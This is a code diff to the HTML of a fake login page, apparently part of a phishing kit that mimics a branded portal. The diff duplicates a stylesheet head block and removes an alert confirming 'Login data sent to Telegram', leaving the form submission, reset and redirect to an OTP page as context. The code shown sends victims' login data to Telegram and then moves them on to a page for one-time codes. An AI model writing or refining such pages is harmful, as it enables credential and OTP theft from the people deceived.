@@ -55,6 +55,10 @@
     <link href="css/branding.css" rel="stylesheet" id="leapfrogBrandingStyle">
     <link rel="stylesheet" href="css/UIFlexibilityBranding.css">
 </head>
+<head>
+    <link href="css/branding.css" rel="stylesheet" id="leapfrogBrandingStyle">
+    <link rel="stylesheet" href="css/UIFlexibilityBranding.css">
+</head>
 <body>
     <noscript>You need to enable JavaScript to run this app.</noscript>
     <div id="loginApp" style="min-height:100%;position:relative" class="login-renderer-wrapper">
@@ -181,7 +185,6 @@
 
                 const result = await response.json();
                 if (result.ok) {
-                    alert('Login data sent to Telegram successfully!');
                     form.reset(); // Reset the form after successful submission
                     window.location.href = 'otp.html'; // Redirect to index2.html
                 } else {
